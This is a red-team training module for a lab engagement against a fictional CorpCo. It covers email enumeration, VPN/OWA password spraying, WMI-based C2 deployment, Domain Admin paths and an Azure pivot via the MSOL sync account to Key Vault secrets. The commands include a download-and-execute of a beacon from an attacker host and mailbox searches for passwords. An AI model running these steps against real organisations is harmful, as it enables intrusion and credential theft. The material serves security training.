---
title: "Full Engagement Simulation — Alternate Scenario: VPN Spray to Cloud Pivot"
tags: [red-team, engagement-simulation, alternate-scenario, VPN, credential-spray,
  phishing, cloud-pivot, Azure, hybrid-identity, kill-chain, ATT&CK, T1078,
  T1566.001, T1550.001, full-chain]
module: 08-RedTeam-03
day: 548
related_topics:
  - Three-Zone Pivoting (Day 547)
  - Red Team Report Writing (Day 549)
  - Cross-Environment Attack Paths (Day 529)
  - Azure Red Teaming (Day 525)
  - C2 OPSEC (Day 522)
---

# Day 548 — Full Engagement Simulation: Alternate Scenario

> "The Offshore episodes gave you one path in. Real engagements do not
> have the same door twice. Today the initial access is different — not a
> vulnerable web application, but valid credentials against a VPN. The
> internal topology is the same but you enter from a different angle.
> Same techniques, different entry point. If you can only follow the script,
> you are not an operator. If you can adapt the technique to the situation,
> you are."
>
> — Ghost

---

## Goals

Execute a complete red team engagement using a different initial access vector
(credential spray against VPN/OWA instead of web exploitation).
Pivot through the internal network to domain compromise.
Execute a cloud pivot from the compromised on-prem domain to Azure AD.
Produce a complete engagement log suitable for a real-time report.

**Prerequisites:** Days 535–540 (Offshore lab episodes), Day 525–526 (Azure),
Days 541–547 (advanced techniques). Full lab environment required.
**Time budget:** 8 hours (full day engagement simulation).

---

## Scenario Brief

```
CLIENT:     CorpCo International (lab simulation)
SCOPE:      Full red team engagement — assumed breach NOT authorised
            External attack surface: CorpCo.lab
            Internal domain: corp.local
            Cloud tenant: tenant.onmicrosoft.com

OBJECTIVES:
  P1: Achieve Domain Admin in corp.local
  P2: Achieve admin access to CorpCo's Azure tenant
  P3: Access the simulated crown jewel (Azure Key Vault or specific file)

INITIAL ACCESS CONSTRAINT:
  Do NOT use web application exploitation for initial access today.
  Use one of:
    Option A — VPN credential spray (if VPN is in lab scope)
    Option B — OWA (Exchange) password spray
    Option C — Phishing simulation (email with malicious link/attachment)
  
  This forces you to operate a full engagement without your Episode 1
  "find a web vuln" safety net.

KNOWN INTEL (threat intel brief):
  CorpCo uses Pulse Secure VPN (simulated)
  Domain email format: firstname.lastname@corp.local (internal)
  Public email: firstname.lastname@corpcointl.com (external)
  LinkedIn suggests 50-100 employees in IT department
  GitHub commit author email: dev1@corpcointl.com
```

---

## Phase 1 — OSINT and User Enumeration (60 min)

```bash
# Build a user list from public sources

# 1. LinkedIn + Hunter.io for email format confirmation:
# hunter.io: search corpcointl.com → verify email format

# 2. Crawl the corporate website for names:
curl -s https://corpcointl.com | grep -oP '[A-Z][a-z]+ [A-Z][a-z]+' | sort -u

# 3. GitHub email mining:
# Search: site:github.com "@corpcointl.com"
# Extract commit author emails

# 4. OSINT tools:
theHarvester -d corpcointl.com -b google,linkedin,github -f harvest.html

# 5. Convert names to email format:
cat names.txt | awk '{
    split($0, a, " ")
    print tolower(a[1]) "." tolower(a[2]) "@corpcointl.com"
}' > emails.txt

# 6. Validate email existence (SMTP verification):
# Tools: mailscheck, smtp-user-enum, O365 tenant validation
# For O365/Azure:
python3 o365spray.py --validate --domain corpcointl.com
python3 o365spray.py --enum -U emails.txt --domain corpcointl.com

# Result: validated list of existing email accounts
```

---

## Phase 2A — VPN Credential Spray (Option A)

```bash
# Pulse Secure VPN or similar — spray with password spray methodology

# CHECK LOCKOUT POLICY FIRST:
# Never spray without knowing the lockout threshold
# For OWA/VPN (pre-authentication): check Autodiscover or error messages
# For AD: proxychains crackmapexec smb <DC_IP> -u user -p pass --pass-pol

# Spray schedule: one password per hour across all users (below lockout threshold)
# Common first attempts: Season+Year, Company+Year!, Welcome1

# Tool: Spray (pure Python, low-and-slow):
python3 spraydication.py \
    --userfile valid_emails.txt \
    --password 'Spring2025!' \
    --url https://vpn.corpcointl.com \
    --delay 3600   # one attempt per user per hour

# Alternative: goengine (Go-based spray, faster):
goengine -u valid_emails.txt -p passwords.txt \
    -t https://vpn.corpcointl.com/api/v1/login \
    --delay 3600 --lockout 3

# When spray returns valid credentials:
#   username: john.smith@corpcointl.com
#   password: Summer2024!

# Verify VPN access:
openconnect vpn.corpcointl.com \
    -u john.smith@corpcointl.com
# Enter password when prompted → VPN connects → internal network reachable

echo "VPN credential: john.smith@corpcointl.com / Summer2024!"
echo "VPN connected: internal network directly routable from attack host"
```

---

## Phase 2B — OWA Spray (Option B)

```bash
# Microsoft Exchange OWA spray — if VPN is not in scope or unavailable

# MailSniper or pyMailSniper for OWA spray:
Import-Module MailSniper.ps1
Invoke-PasswordSprayOWA \
    -ExchHostname mail.corpcointl.com \
    -UserList valid_emails.txt \
    -Password 'Summer2024!' \
    -Threads 5 \
    -OutFile owa_spray_results.txt

# After successful spray → read emails for recon:
Get-GlobalAddressList -ExchHostname mail.corpcointl.com \
    -UserName domain\john.smith -Password 'Summer2024!' \
    -OutFile gal.txt
# GAL gives full employee directory with email addresses → extend spray list

# Access inbox — look for:
# VPN config instructions (give you VPN URL and perhaps second factor workaround)
# IT tickets with internal IPs mentioned
# Password reset emails (reveals username formats)
Invoke-SelfSearch -MailboxName john.smith@corpcointl.com \
    -ExchHostname mail.corpcointl.com \
    -SearchTerm "password" -OutputCsv emails_pass.csv
```

---

## Phase 3 — Internal Access and C2 Deployment (60 min)

```bash
# After VPN or OWA access — establish C2 on an internal host

# VPN scenario: you have a VPN connection → attack host is on corp.local network
# Equivalent to being on the internal LAN

# Deploy C2 beacon to an internal host using acquired credentials:
# (Use the credential from the spray — john.smith is a standard user)

# Identify hosts where john.smith has local admin (BloodHound later, CME now):
crackmapexec smb 10.10.10.0/24 \
    -u 'john.smith' -p 'Summer2024!' \
    --local-auth   # if local admin, flags with (Pwn3d!)

# If john.smith is not a local admin on anything:
# Lateral move via credential spray of internal SMB (different password set)
crackmapexec smb 10.10.10.0/24 \
    -u 'john.smith' -p 'Summer2024!' \
    --shares          # enum shares — read C$? local admin

# Deploy C2 beacon via WMI:
impacket-wmiexec corp.local/john.smith:'Summer2024!'@10.10.10.20
> powershell -c "(New-Object Net.WebClient).DownloadFile('http://AttackHost:8000/beacon.exe','C:\Temp\beacon.exe'); Start-Process C:\Temp\beacon.exe"

# Verify callback in Sliver:
sessions
# → New session from 10.10.10.20
```

---

## Phase 4 — Domain Compromise via Alternate Path (90 min)

```
Today: do NOT use the same DA path you used in Episodes 3.
Pick a DIFFERENT path from BloodHound.

After BloodHound ingest:
  → Run "Shortest Path from Owned Principals" (mark john.smith as Owned)
  → Pick the SECOND shortest path (not the one you used before)

Common alternate paths:
  1. ASREPRoasting → crack → account with privileged access
  2. Shadow Credentials on a higher-privilege account
  3. ADCS ESC4 → modify template → issue DA cert
  4. Unconstrained Delegation + Printer Bug (if a non-DC has TrustedForDelegation)
  5. GenericWrite on a Group → add john.smith to privileged group

Execute your chosen alternate path:
  Chosen path: _______________________________________________
  Reason for choice: ________________________________________
  Steps executed: ____________________________________________
  DA achieved: [ ] Yes  [ ] No
  Time taken: ___________
```

---

## Phase 5 — Cloud Pivot to Azure AD (60 min)

```bash
# After achieving Domain Admin in corp.local:
# Check for AAD Connect (hybrid identity)

# Find AAD Connect server:
Get-ADUser -Filter {SamAccountName -like "MSOL*"} \
    -Properties msDS-ExternalDirectoryObjectId |
    Select-Object Name, SamAccountName

# MSOL_* account = AAD Connect sync account with DCSync rights
# If found: DCSync its credentials, use for Azure AD operations

# Enumerate the Azure tenant:
# With the MSOL account's credentials or a global admin account from DCSync:
# (Test: do any DCSync'd accounts authenticate to Azure?)

# Use roadrecon to enumerate Azure AD:
proxychains roadrecon gather \
    -u MSOL_account@corpcointl.onmicrosoft.com \
    -p '<MSOL_pass>' \
    --mfa-method none

proxychains roadrecon dump
roadrecon gui   # launch web UI to explore

# Identify high-privilege Service Principals, Users, Applications

# Add credential to a high-privilege Service Principal:
az ad sp credential reset \
    --id <SP_OBJECT_ID> \
    --append \
    --years 1

# Authenticate as the SP:
az login --service-principal \
    -u <APP_ID> -p <new_credential> \
    --tenant <TENANT_ID>

# Access Azure Key Vault (simulated crown jewel):
az keyvault secret list --vault-name CorpCoVault
az keyvault secret show --vault-name CorpCoVault --name "DatabasePassword"

# Capture: contents of the Key Vault secret = crown jewel
```

---

## Engagement Log Template (Fill In As You Go)

```
=== ENGAGEMENT LOG ===

Date: ________________
Operator: ____________
Target: CorpCo International (lab)

TIMELINE:
Time    | Action                                          | Result
--------|------------------------------------------------|--------
        | Started OSINT / user enum                      |
        | Completed email list (N users)                 |
        | Started spray                                  |
        | Valid credentials found                        |
        | Internal access established                    |
        | C2 beacon deployed                             |
        | BloodHound collected                           |
        | DA path identified                             |
        | DA achieved                                    |
        | DCSync completed                               |
        | Azure pivot initiated                          |
        | Crown jewel accessed                           |
        | Cleanup started                                |
        | Cleanup completed                              |

CREDENTIALS CAPTURED:
  Source                | Username              | Secret Type       | Used For
  --------------------- | --------------------- | ----------------- | --------
                        |                       |                   |
                        |                       |                   |

HOSTS COMPROMISED:
  IP / Hostname         | OS      | Access Level | Technique Used
  --------------------- | ------- | ------------ | ---------------
                        |         |              |
                        |         |              |

TECHNIQUES USED (ATT&CK mapping):
  Phase     | Technique          | ATT&CK ID   | Notes
  ----------|--------------------|-------------|------
  Recon     |                    |             |
  Initial   |                    |             |
  Execution |                    |             |
  PrivEsc   |                    |             |
  Lateral   |                    |             |
  DA        |                    |             |
  Cloud     |                    |             |

CLEANUP COMPLETED: [ ] Yes  [ ] No
  Remaining artefacts: _______________________________________
```

---

## Debrief Questions

```
1. How did the alternate initial access vector (VPN/OWA spray) change your
   operational tempo compared to exploiting a web application?
   _______________________________________________________________

2. What is the lockout risk of password spraying vs web application exploitation?
   How did you mitigate it?
   _______________________________________________________________

3. You used a different DA path than Episodes 1–4. Was it harder or easier?
   What determined the difficulty?
   _______________________________________________________________

4. The cloud pivot required the MSOL account or a cloud admin credential
   from the DCSync. What would you do if no cloud credentials were found in
   the domain hash dump?
   _______________________________________________________________

5. Name one detection that would have caught you at each phase:
   Spray: ________________________________________________________
   Internal access: ______________________________________________
   DA path: ______________________________________________________
   Cloud pivot: __________________________________________________
```

---

## Key Takeaways

1. Credential spraying against VPN or OWA is one of the most common real-world
   initial access techniques. It requires only a valid email list and a patient
   spray schedule. The defender's mitigation: MFA on all externally-facing auth
   points — but MFA bypass (Evilginx, AiTM phishing) is the next chapter.
2. Alternate DA paths force you to understand the BloodHound graph, not just
   memorise a specific chain. Real environments have many paths; real operators
   know how to read the graph and choose the best path for the current context.
3. The MSOL account is the most dangerous account in most hybrid environments
   and the least monitored. Its password is auto-generated and rarely rotated;
   its rights (DCSync equivalent) are rarely audited. Finding it in DCSync
   output and using it for Azure pivot is a documented real-world technique.
4. A full engagement timeline log is a professional output, not optional record-
   keeping. The log feeds the report, proves scope compliance, enables evidence
   preservation for legal purposes, and forms the basis of the remediation
   priority matrix. Every action must be documented at the time it happens.
5. Varying your scenarios deliberately — as this exercise forces — is how you
   build genuine competency vs. pathway memorisation. The competency gate
   (Day 560) will present an unknown scenario. Having executed at least two
   complete alternate paths prepares you for that unknown.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q548.1, Q548.2 …).

---

## Navigation

← Previous: [Day 547 — Three-Zone Pivoting](DAY-0547-Three-Zone-Pivoting-Deep-Network.md)
→ Next: [Day 549 — Red Team Report Writing Sprint](DAY-0549-Red-Team-Report-Writing-Sprint.md)
